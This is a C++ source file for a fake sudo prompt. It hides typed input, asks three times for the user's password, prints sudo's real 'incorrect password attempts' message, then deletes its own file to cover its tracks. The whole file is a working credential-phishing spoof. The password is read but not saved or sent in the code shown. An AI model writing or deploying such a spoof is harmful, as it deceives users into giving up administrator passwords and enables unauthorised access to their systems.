#include <iostream>
#include <unistd.h>

int main() {
    // Turn off the character echo to the screen.
    system("stty -echo");

    // Prompt user for password and then read input.
    int promptCount = 1;
    std::string passwordInput;
    while (promptCount <= 3) {
        std::cout << "[sudo] password for " << getlogin() << ": ";
        std::cin >> passwordInput;
        std::cout << std::endl;
        sleep(3); // sudo will pause between repeated prompts
        promptCount++;
    }

    // Turn the character echo back on.
    system("stty echo");

    // Display sudo's actual error message and then delete self.
    std::cout << "sudo: 3 incorrect password attempts" << std::endl;
    std::remove("program_name");

    return 1;  // sudo returns 1 with a failed password attempt
}
